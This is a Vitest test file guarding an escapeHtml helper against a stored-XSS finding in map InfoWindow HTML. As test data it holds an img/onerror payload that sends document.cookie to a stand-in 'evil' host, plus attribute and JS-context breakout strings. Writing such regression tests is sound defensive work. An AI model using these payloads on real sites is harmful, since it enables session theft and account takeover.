import { describe, it, expect } from 'vitest'
import { escapeHtml } from '@/lib/utils'

// Regression guard for H-4 (2026-06-11 pentest): user-controlled text
// (discrepancy titles, NAVAID notes, waiver descriptions, obstruction notes,
// sign text, fixture IDs) is interpolated into Google Maps InfoWindow HTML and
// assigned via setContent() → innerHTML. Without escaping, a stored payload
// runs in the viewing admin's session (stored XSS). escapeHtml must neutralize
// every HTML-significant character so a value can break out of neither text
// content nor a double-quoted attribute.
describe('escapeHtml — stored-XSS guard for map InfoWindows', () => {
  it('neutralizes the classic img/onerror payload', () => {
    const payload = `<img src=x onerror="fetch('https://evil/'+document.cookie)">`
    const out = escapeHtml(payload)
    expect(out).not.toContain('<img')
    expect(out).not.toContain('<')
    expect(out).not.toContain('>')
    expect(out).toContain('&lt;img')
  })

  it('escapes all five HTML-significant characters', () => {
    expect(escapeHtml(`& < > " '`)).toBe('&amp; &lt; &gt; &quot; &#39;')
  })

  it('prevents double-quoted attribute breakout', () => {
    // value="${escapeHtml(x)}" must not be escapable by closing the quote.
    const out = escapeHtml('" onmouseover="alert(1)')
    expect(out).not.toContain('"')
    expect(out).toContain('&quot;')
  })

  it('prevents single-quoted JS-context breakout', () => {
    const out = escapeHtml(`'); alert(1); ('`)
    expect(out).not.toContain(`'`)
    expect(out).toContain('&#39;')
  })

  it('handles null/undefined/number without throwing', () => {
    expect(escapeHtml(null)).toBe('')
    expect(escapeHtml(undefined)).toBe('')
    expect(escapeHtml(42)).toBe('42')
  })

  it('leaves benign text intact', () => {
    expect(escapeHtml('TWY K Edge Light 12L')).toBe('TWY K Edge Light 12L')
  })
})
